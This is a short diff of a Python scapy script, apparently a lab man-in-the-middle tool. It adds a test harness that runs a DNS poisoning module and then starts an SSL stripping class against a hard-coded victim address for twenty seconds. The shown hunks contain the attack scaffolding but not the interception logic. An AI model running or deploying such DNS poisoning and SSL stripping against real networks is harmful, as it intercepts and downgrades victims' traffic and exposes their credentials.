@@ -8,7 +8,10 @@ from scapy.all import *
 #from scapy.layers.ssl_tls import *
 import os
 import threading
+import time
 import cryptography    #required for tls
+
+import dns_poisoning
 
 #load_layer("tls")    #enables tls for the https connection with the server
 #load_layer("http")    #also useful
@@ -124,10 +127,23 @@ class SslRemover():
 
         print "SSL stripping stopped"
 
-if __name__ == "__main__":
+def test_cb():
+
+    dns_poisoning.test()
+
     ip_victim = "10.0.123.5"
+
     ssl_remover = SslRemover(ip_victim, 2)
+
     ssl_remover.start()
     time.sleep(20)
     ssl_remover.stop()
->>>>>>> 66fbb5c4406af6c989f9e7c55fe4ac9a05626b61
+
+def test():
+
+    thread = threading.Thread(target=test_cb)
+    thread.run()
+
+if __name__ == "__main__":
+
+    test()
